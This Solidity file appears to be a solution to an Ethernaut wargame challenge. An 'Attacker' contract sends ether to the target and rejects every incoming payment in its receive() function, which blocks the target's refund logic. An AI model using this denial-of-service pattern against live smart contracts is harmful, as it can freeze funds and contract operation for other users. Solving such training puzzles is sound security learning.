// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "./Ethernaut.sol";

contract Attacker {
    Ethernaut public ethernaut;

    constructor(address payable _ethernaut) {
        ethernaut = Ethernaut(_ethernaut);
    }

    function sendMoney() public payable {
        (bool success, ) = address(ethernaut).call{value: msg.value}("");
        require(success);
    }

    receive() external payable {
        revert("You lost");
    }
}
